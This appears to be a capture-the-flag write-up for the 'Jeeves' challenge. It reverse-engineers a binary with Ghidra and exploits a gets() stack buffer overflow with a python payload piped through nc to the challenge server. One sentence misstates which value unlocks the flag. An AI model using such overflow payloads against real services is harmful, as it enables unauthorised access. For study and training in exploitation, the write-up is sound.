# Jeeves
## Difficulty: Easy 

When start the challenge with a binary file.

I'll use Ghidra to understand what the program does.

After letting Ghidra disassemble it, we can start examining the program from the main function.

## Reverse engineering the binary:

```cpp
undefined8 main(void)
{
  char local_48 [44];
  int local_1c;
  void *local_18;
  int local_c;
  
  local_c = -0x21523f2d;
  printf("Hello, good sir!\nMay I have your name? ");
  gets(local_48);
  printf("Hello %s, hope you have a good day!\n",local_48);
  if (local_c == 0x1337bab3) {
    local_18 = malloc(0x100);
    local_1c = open("flag.txt",0);
    read(local_1c,local_18,0x100);
    printf("Pleased to make your acquaintance. Here\'s a small gift: %s\n",local_18);
    close(local_1c);
  }
  return 0;
}
```

We can see that the flag will be revealed only if the variable "local_c" has the value of '-0x21523f2d'. Even though there is no direct way to change the value of "local_c", the use of function "gets()" represents a buffer overflow vulnerability. We can overwrite the value of "local_c".

I'll use python to achieve this.

### Determining the length of the payload:

```assembly
                undefined main()
undefined         AL:1           <RETURN>
undefined4        Stack[-0xc]:4  local_c                                 XREF[2]:     001011f5(W), 
                                                                                      00101236(R)  
undefined8        Stack[-0x18]:8 local_18                                XREF[3]:     00101249(W), 
                                                                                      00101266(R), 
                                                                                      00101281(R)  
undefined4        Stack[-0x1c]:4 local_1c                                XREF[3]:     00101263(W), 
                                                                                      0010126a(R), 
                                                                                      00101299(R)  
undefined1        Stack[-0x48]:1 local_48                                XREF[2]:     0010120d(*), 
                                                                                      0010121e(*)  
```

The length of the payload is the difference between the stack address of "local_48" and "local_c" plus the length of the new value for "local_c".

```python3
print((0x48-0xc)) 

60
```

We'll also need the new value for "local_c", 0x1337bab3 written in reverse (because of little endian). 

```
0xb3 0xba 0x37 0x13
```

We can now write the payload.
```bash
python3 -c "print('A'*(0x48-0xc))"

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

python3 -c "import sys;sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb3\xba\x37\x13\x0a')"|nc 94.237.54.42 59492

Hello, good sir!
May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��7, hope you have a good day!
Pleased to make your acquaintance. Here's a small gift: HTB{w3l....
```

#### Note: "0xa" represents the "enter" value. It's necessary for interacting with the server!

### We got the flag!
